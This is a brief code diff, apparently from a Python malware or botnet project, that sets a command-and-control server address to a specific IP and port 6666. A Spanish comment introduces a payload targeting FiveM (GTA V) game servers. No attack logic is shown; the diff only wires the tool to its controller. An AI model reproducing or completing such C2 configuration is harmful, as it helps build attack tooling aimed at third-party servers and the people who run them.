@@ -5,8 +5,8 @@ import os
 import random
 
 # Configuration
-C2_ADDRESS  = ""
-C2_PORT     = 101
+C2_ADDRESS  = "134.255.234.140"
+C2_PORT     = 6666
 
 
 # Payload para FiveM (servidores de GTA V)
